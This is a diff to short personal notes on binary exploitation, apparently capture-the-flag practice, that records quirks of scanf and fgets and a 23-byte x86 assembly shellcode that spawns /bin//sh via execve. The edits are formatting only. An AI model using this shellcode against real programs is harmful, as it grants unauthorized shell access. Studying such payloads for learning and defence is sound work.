@@ -1,10 +1,10 @@
-###Rusty notes###
+### Rusty notes ###
 
 - scanf: terminated after space (be careful)
 - fgets: need to fill with exact bytes
 
 - shellcode payload:
-payload = """
+payload = ```"""
     xor eax,eax
     push eax
     push 0x68732f2f 
@@ -15,7 +15,7 @@ payload = """
     mov ecx,esp
     mov al,0xb
     int 0x80 
-"""
+"""```
 size = 23 bytes
 
 Too lazy to use format strings in pwntool so:
